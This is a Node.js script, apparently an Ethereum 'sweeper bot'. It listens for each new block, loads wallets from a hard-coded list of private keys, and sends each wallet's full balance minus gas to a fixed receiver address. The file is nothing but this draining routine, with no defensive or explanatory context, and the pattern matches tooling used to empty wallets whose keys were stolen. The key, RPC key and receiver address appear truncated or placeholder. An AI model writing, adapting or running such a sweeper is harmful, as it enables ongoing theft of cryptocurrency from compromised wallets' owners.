const { ethers } = require("ethers");
const { BigNumber, utils } = ethers;

const provider = new ethers.providers.JsonRpcProvider(
  "https://mainnet.infura.io/v3/0a76d892ksd231"
);
const addressReceiver = "0x6A3d92AAd7d06E49276697Df992";
const privateKeys = [
  "82d1dec2478",
];

const bot = async () => {
  provider.on("block", async () => {
    console.log("Listening new block, waiting..)");
    for (let i = 0; i < privateKeys.length; i++) {
      const _target = new ethers.Wallet(privateKeys[i]);
      const target = _target.connect(provider);
      const balance = await provider.getBalance(target.address);
      console.log('Wallet balance: ', ethers.utils.formatEther(balance));
      
      const gasLimit = 23000; // default 21000
      const gasPrice = await provider.getGasPrice();

      const maxGasFee = BigNumber.from(gasLimit).mul(gasPrice)
      console.log('Tx gas price: ', ethers.utils.formatEther(maxGasFee));

      if (balance.sub(maxGasFee) > 0) {
        console.log("NEW ACCOUNT WITH ETH!");
        const amount = balance.sub(maxGasFee);
        try {
          await target.sendTransaction({
            to: addressReceiver,
            value: amount,
            gasPrice: gasPrice,
            gasLimit: gasLimit,
          });
          console.log(
            `Success! transfered --> ${ethers.utils.formatEther(balance)}`
          );
        } catch (e) {
          console.log(`error: ${e}`);
        }
      }
    }
  });
};

bot();
